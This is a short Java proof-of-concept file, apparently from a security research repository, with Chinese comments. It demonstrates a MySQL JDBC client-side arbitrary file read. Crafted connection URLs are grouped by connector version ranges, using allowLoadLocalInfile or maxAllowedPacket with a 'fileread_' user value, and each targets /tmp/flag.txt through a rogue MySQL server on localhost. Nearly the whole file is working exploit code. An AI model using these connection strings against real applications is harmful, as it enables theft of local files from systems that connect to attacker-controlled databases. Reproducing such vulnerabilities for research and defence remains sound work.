package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * 文件读取
 * mysql https://mvnrepository.com/artifact/mysql/mysql-connector-java
 * 复现使用 https://github.com/fnmsd/MySQL_Fake_Server
 *
 * @author Whoopsunix
 */
public class FileAttack {
    public static void main(String[] args) throws Exception {
        /**
         * [3.1.11, 3.1.14]
         */
        String fileReadAttackURL_3 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";

        /**
         * [5.0.2, 5.1.48]
         */
        String fileReadAttackURL_5 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";

        /**
         * [6.0.2, 6.0.6]
         */
        String fileReadAttackURL_6 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&user=fileread_/tmp/flag.txt";

        /**
         * [8.0.7-dmr,8.0.23]
         */
        String fileReadAttackURL_8_7_23 = "jdbc:mysql://127.0.0.1:3306/test?&allowLoadLocalInfile=true&user=fileread_/tmp/flag.txt";

        // 低版本需要加载
        String driver = "com.mysql.jdbc.Driver";
        Class.forName(driver);

        String test = "jdbc:mysql://127.0.0.1:3306/test?&allowLoadLocalInfile=true&user=fileread_/tmp/flag.txt";

        Connection connection = DriverManager.getConnection(fileReadAttackURL_8_7_23);
    }

}
